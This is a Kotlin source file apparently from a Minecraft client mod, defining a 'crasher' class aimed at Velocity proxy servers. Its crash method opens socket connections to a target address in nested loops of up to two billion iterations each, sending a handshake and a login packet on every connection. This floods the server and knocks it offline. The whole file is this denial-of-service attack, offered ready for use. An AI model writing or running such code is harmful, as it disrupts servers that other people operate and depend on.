package net.tarasandedevelopment.tarasande_crasher.crasher.impl

import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueText
import net.tarasandedevelopment.tarasande_crasher.crasher.Crasher
import java.io.DataOutputStream
import java.net.Socket

class CrasherVelocity : Crasher("Velocity") {

    private val sessionName = ValueText(this, "Session name", "a")
    private val protocolVersion = ValueText(this, "Protocol version", "47")

    override fun crash(address: String, port: Int) {
        val handshake = createHandshakePacket(address, port, protocolVersion.value.toIntOrNull()?: 47) // TODO | Notifications
        val login = createHelloWorldPacket(sessionName.value)

        for (i in 0 until 2000000000) {
            for (j in 0 until 2000000000) {
                val socket = Socket(address, port)
                val output = DataOutputStream(socket.getOutputStream())

                writePacket(handshake, output)
                writePacket(login, output)

                socket.close()
            }
        }
    }
}
